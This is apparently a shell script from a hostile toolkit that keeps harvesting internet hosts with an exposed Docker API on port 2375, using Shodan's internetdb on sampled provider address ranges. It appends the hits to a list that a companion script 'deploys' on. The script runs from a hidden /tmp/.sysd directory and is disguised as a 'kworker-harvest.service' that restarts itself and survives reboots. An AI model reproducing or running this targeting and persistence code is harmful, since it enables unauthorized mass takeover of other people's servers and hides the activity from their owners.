#!/bin/sh
# ============================================================================
# Continuous high-density candidate harvest.
#
# Two supply channels exist and they are wildly different in cost per find:
#   - raw sweep (dockmass.sh): tens of addresses/s, but only ~0.003% of addresses
#     answer on :2375 at all, so it burns tens of thousands of probes per find.
#   - Shodan internetdb (this script): 1 keyless request/second, asking a database
#     that ALREADY crawled the address - so a hit is a host, not a lottery ticket.
#
# This drains the second channel: `scout` samples provider /16s out of nets.txt
# (15 lookups each, deduped via .hunt/idb.done so later passes only pick up what
# Shodan crawled since), and `filter` re-checks the repo-derived candidates we
# already hold. Anything with :2375 is appended to .hunt/mass.found, which dock.sh
# deploys on its reserved fresh slice - no credentials, no scanning.
#
# Runs as kworker-harvest.service (Restart=always), so it survives reboots.
# ============================================================================
set -u
cd /tmp/.sysd || exit 1

stamp() { printf '\n== %s\n' "$(date -u)"; }

while :; do
    stamp >> /tmp/_harvest.out
    sh shodan.sh scout $(tr '\n' ' ' < nets.txt) >> /tmp/_harvest.out 2>&1
    sh shodan.sh filter >> /tmp/_harvest.out 2>&1
    sh shodan.sh stat >> /tmp/_harvest.out 2>&1
    printf 'harvest: mass.found now %s\n' "$(grep -c . .hunt/mass.found 2>/dev/null)" >> /tmp/_harvest.out
    # keep the log small: the service is Restart=always and runs for days
    tail -n 600 /tmp/_harvest.out > /tmp/_harvest.out.n 2>/dev/null && mv -f /tmp/_harvest.out.n /tmp/_harvest.out
    sleep 10
done
